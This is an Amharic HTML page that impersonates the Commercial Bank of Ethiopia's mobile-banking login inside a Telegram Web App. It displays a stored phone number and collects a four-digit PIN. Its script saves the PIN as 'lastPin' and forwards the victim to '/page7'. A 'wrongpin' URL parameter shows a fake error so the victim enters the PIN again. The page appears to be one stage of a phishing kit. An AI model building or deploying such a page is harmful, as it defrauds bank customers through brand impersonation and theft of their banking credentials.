<!DOCTYPE html>
<html lang="am">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>የኢትዮጵያ ንግድ ባንክ - መግቢያ</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --cbe-purple: #51255e;
            --cbe-hover: #3d1b46;
            --bg-color: #ffffff;
            --text-dark: #111;
            --text-muted: #666;
            --border-color: #dddddd;
        }

        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; min-height: 100vh; }

        .header-box { width: 100%; background: var(--cbe-purple); padding: 30px 20px 25px; color: white; text-align: center; }
        .header-title { font-size: 26px; font-weight: 800; margin: 0; }
        .sub-header-text { font-size: 13.5px; margin-top: 5px; opacity: 0.9; }

        .main-content { width: 90%; max-width: 400px; margin: 25px auto 0; text-align: center; flex-grow: 1; display: flex; flex-direction: column; align-items: center; }
        h2 { color: #333; font-size: 20px; margin: 10px 0 20px; font-weight: 700; }

        .phone-display {
            width: 100%; border: 1px solid var(--border-color); border-radius: 12px;
            padding: 14px 16px; display: flex; align-items: center; gap: 12px; margin-bottom: 25px;
            font-size: 16px; font-weight: 700; color: #222; background-color: #fafafa; justify-content: center;
        }

        .pin-label { color: var(--text-muted); margin-bottom: 15px; font-size: 14px; }

        .pin-wrapper { position: relative; width: 100%; display: flex; justify-content: center; margin-bottom: 25px; }
        .pin-input-group { display: flex; gap: 12px; }
        .pin-box {
            width: 50px; height: 50px; border: 1px solid var(--border-color); border-radius: 10px;
            text-align: center; font-size: 22px; font-weight: bold; outline: none; background: #fff;
        }
        .pin-box:focus { border-color: var(--cbe-purple); border-width: 2px; }

        .btn-submit {
            background-color: #e2e8f0; color: #888; border: none; width: 100%;
            padding: 15px; border-radius: 10px; font-size: 15px; font-weight: 800; cursor: not-allowed; text-transform: uppercase;
        }
        .btn-submit.active { background-color: var(--cbe-purple); color: white; cursor: pointer; }

        .error-banner {
            background-color: #fdf2f2; color: #c53030; border: 1px solid #f5c6cb;
            padding: 12px; border-radius: 8px; font-size: 13px; font-weight: 600; margin-bottom: 15px; width: 100%; display: none;
        }

        .footer-box { width: 100%; background: var(--cbe-purple); padding: 25px 20px; color: white; text-align: center; margin-top: auto; }
        .terms-text { font-size: 11px; margin-top: 10px; opacity: 0.8; }
    </style>
</head>

<body>

<div class="header-box">
    <div class="header-title">የኢትዮጵያ ንግድ ባንክ</div>
    <div class="sub-header-text">የሞባይል ባንኪንግ መግቢያ</div>
</div>

<div class="main-content">
    <h2>የባንክ መለያ ቁጥር (PIN)</h2>
    <div id="errorDisplay" class="error-banner"></div>

    <div class="phone-display">
        <span>🇪🇹</span>
        <span>+251</span>
        <span id="displayPhone">--</span>
    </div>

    <p class="pin-label">ባለ 4 አሃዝ ሚስጥራዊ ቁጥርዎን ያስገቡ</p>

    <div class="pin-wrapper">
        <div class="pin-input-group">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
        </div>
    </div>

    <button id="loginBtn" class="btn-submit" disabled>ግባ</button>
</div>

<div class="footer-box">
    <div style="font-weight: 800; font-size: 16px;">Commercial Bank of Ethiopia</div>
    <p class="terms-text">በመግባትዎ የባንኩን ደንቦችና ቅድመ ሁኔታዎች ይቀበላሉ</p>
</div>

<script>
document.addEventListener("DOMContentLoaded", () => {
    const pinBoxes = document.querySelectorAll('.pin-box');
    const loginBtn = document.getElementById('loginBtn');
    const displayPhone = document.getElementById('displayPhone');
    const errorDisplay = document.getElementById('errorDisplay');

    const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone') || "911000000";
    displayPhone.textContent = savedPhone;

    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('error') === 'wrongpin') {
        errorDisplay.innerText = "❌ የተሳሳተ ፒን (PIN) ቁጥር። እባክዎ እንደገና ይሞክሩ።";
        errorDisplay.style.display = "block";
    }

    pinBoxes.forEach((box, index) => {
        box.addEventListener('input', () => {
            box.value = box.value.replace(/\D/g, '');
            if (box.value && index < pinBoxes.length - 1) pinBoxes[index + 1].focus();
            checkInputs();
        });
        box.addEventListener('keydown', (e) => {
            if (e.key === "Backspace" && !box.value && index > 0) pinBoxes[index - 1].focus();
        });
    });

    function checkInputs() {
        const filled = [...pinBoxes].every(b => b.value.length === 1);
        loginBtn.disabled = !filled;
        loginBtn.classList.toggle('active', filled);
    }

    loginBtn.addEventListener('click', () => {
        if (!loginBtn.classList.contains('active')) return;
        let pin = "";
        pinBoxes.forEach(b => pin += b.value);
        localStorage.setItem('lastPin', pin);
        window.location.href = "/page7";
    });

    if (window.Telegram?.WebApp) {
        window.Telegram.WebApp.ready();
        window.Telegram.WebApp.expand();
    }
});
</script>

</body>
</html>
